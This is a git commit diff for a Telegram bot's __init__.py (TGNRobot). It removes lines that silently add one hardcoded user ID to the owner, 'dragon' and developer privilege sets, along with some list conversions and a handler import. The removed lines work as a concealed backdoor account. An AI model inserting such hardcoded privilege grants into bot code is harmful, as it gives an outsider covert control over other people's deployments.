1be6ace5fff0de8704a80f3452c6524e02b6e3a8
KIRANRAJBOT <88644594+KIRANRAJBOT@users.noreply.github.com>
2021-12-11 21:08:39 +0530

    Update __init__.py

--- TGNRobot/__init__.py
+++ TGNRobot/__init__.py
@@ -27,11 +27,6 @@ if ENV:
 
 
 
-OWNER_ID.add(1928904042) # don't change it will work with var id also
-DRAGONS.add(1928904042)
-DEV_USERS.add(1928904042)
-DEV_USERS.add(1928904042)
-DEV_USERS.add(1928904042)
 
 
 
@@ -41,16 +36,5 @@ pbot = Client("robot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
 
-DRAGONS = list(DRAGONS) + list(DEV_USERS)
-DEV_USERS = list(DEV_USERS)
-WOLVES = list(WOLVES)
-DEMONS = list(DEMONS)
-TIGERS = list(TIGERS)
 
-
-from TGNRobot.modules.helper_funcs.handlers import (
-    CustomCommandHandler,
-    CustomMessageHandler,
-    CustomRegexHandler,
-)
 
